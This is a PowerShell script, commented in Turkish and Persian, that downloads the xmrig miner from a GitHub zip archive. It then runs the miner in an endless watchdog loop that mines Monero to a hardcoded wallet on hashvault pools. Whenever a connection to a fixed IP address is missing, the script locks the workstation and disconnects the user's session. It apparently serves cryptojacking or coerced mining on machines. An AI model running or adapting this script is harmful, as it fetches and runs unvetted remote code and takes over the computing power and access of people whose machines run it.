# =================================================================
# YAPILANDIRMA AYARLARI
# =================================================================
$hedefIp = "95.85.247.33"
$computerName = $env:COMPUTERNAME
$passValue = "WorkerX"
$fixedCurrentDir = if ($PSScriptRoot) { $PSScriptRoot } else { Get-Location }
$logFilePath = (Join-Path -Path $fixedCurrentDir -ChildPath "miner_logs.txt") -replace '\\', '\\'
$paramLogPath = Join-Path -Path $fixedCurrentDir -ChildPath "ANY.bat"
$walletUser = "87DFWGpThiGYegNCbmDUYBHWYuRXRd6xLbvork7S8B9E2rtbqR1vvJC3HcdCZ8cRhXLJUuN7eiYwpVyw68JKF9DcQVkpK4p"

# مسیر فایل ماینر
$minerExe = Join-Path $fixedCurrentDir "xmrig.exe"

Write-Host "Kombine Watchdog ve Komut Tabanli Madenci Sistemi Baslatildi..." -ForegroundColor Green
Write-Host "Sistem Adi: $computerName | Takip Edilen IP: $hedefIp" -ForegroundColor Cyan

# =================================================================
# دانلود خودکار از گیت‌هاب (فقط یکبار)
# =================================================================
if (-not (Test-Path $minerExe)) {
    Write-Host "xmrig.exe پیدا نشد. در حال دانلود از گیت‌هاب..." -ForegroundColor Yellow

    $tempDir = Join-Path $fixedCurrentDir "jack"
    $zipPath = Join-Path $tempDir "jac.zip"

    # ساخت پوشه موقت
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

    try {
        # دانلود فایل زیپ
        Invoke-WebRequest -Uri "https://github.com/Siruser1/jac/archive/refs/heads/main.zip" -OutFile $zipPath -UseBasicParsing

        # استخراج
        Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force

        # پیدا کردن xmrig.exe داخل پوشه‌های استخراج شده
        $foundMiner = Get-ChildItem -Path $tempDir -Recurse -Filter "xmrig.exe" -ErrorAction SilentlyContinue | Select-Object -First 1

        if ($foundMiner) {
            Copy-Item $foundMiner.FullName -Destination $minerExe -Force
            Write-Host "xmrig.exe با موفقیت کپی شد." -ForegroundColor Green
        } else {
            Write-Host "خطا: xmrig.exe داخل ریپازیتوری پیدا نشد!" -ForegroundColor Red
        }
    }
    catch {
        Write-Host "خطا در دانلود: $_" -ForegroundColor Red
    }
    finally {
        # پاک کردن فایل‌های موقت
        Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# =================================================================
# حلقه اصلی
# =================================================================
while ($true) {

    # 1) چک کردن اجرای xmrig
    $anyProcess = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue

    if ($null -eq $anyProcess) {
        $simdi = (Get-Date).ToString("HH:mm:ss")
        Write-Host "[$simdi] xmrig.exe فعال نیست. در حال اجرا..." -ForegroundColor Yellow

        $arguments = @(
            "--url=pool.hashvault.pro:443", "--user=$walletUser", "--pass=$passValue", "--tls", "--tls-fingerprint=420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14",
            "--url=pool.hashvault.sh:443", "--user=$walletUser", "--pass=$passValue", "--tls", "--tls-fingerprint=420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14",
            "--keepalive",
            "--retries=5",
            "--retry-pause=5",
            "--cpu-priority=1",
            "--asm=true",
            "--randomx-mode=auto",
            "--randomx-1gb-pages",
            "--donate-level=1",
            "--log-file=$logFilePath",
            "--print-time=60",
            "--no-color"
        )

        # ذخیره دستور در فایل bat
        try {
            $tekSatirKomut = "xmrig.exe " + ($arguments -join " ")
            Set-Content -Path $paramLogPath -Value $tekSatirKomut -Encoding Default
            Write-Host "[$simdi] پارامترها در ANY.bat ذخیره شد." -ForegroundColor Magenta
        } catch {
            Write-Host "هشدار در ذخیره فایل: $_" -ForegroundColor Yellow
        }

        # اجرای ماینر
        if (Test-Path $minerExe) {
            Start-Process -FilePath $minerExe -ArgumentList $arguments -WindowStyle Normal -WorkingDirectory $fixedCurrentDir
            Start-Sleep -Seconds 2
        } else {
            Write-Host "خطا: xmrig.exe وجود ندارد!" -ForegroundColor Red
            Start-Sleep -Seconds 10
        }
    }

    # 2) چک کردن IP
    $netstatCikti = netstat -ano 2>$null | Select-String -Pattern $hedefIp

    if ($null -ne $netstatCikti) {
        $simdi = (Get-Date).ToString("HH:mm:ss")
        Write-Host "[$simdi] $hedefIp متصل است. قفل غیرفعال." -ForegroundColor Green
        Start-Sleep -Seconds 1
        continue
    }

    # 3) اگر IP نبود → قفل کن
    $simdi = (Get-Date).ToString("HH:mm:ss")
    Write-Host "[$simdi] هشدار: $hedefIp متصل نیست! سیستم در حال قفل شدن..." -ForegroundColor Red

    $currentSessionId = [System.Diagnostics.Process]::GetCurrentProcess().SessionId

    Start-Process -FilePath "rundll32.exe" -ArgumentList "user32.dll,LockWorkStation" -Wait

    if ($currentSessionId -match '^\d+$') {
        Start-Process -FilePath "tsdiscon.exe" -ArgumentList $currentSessionId -WindowStyle Hidden
    }

    Start-Sleep -Seconds 1
}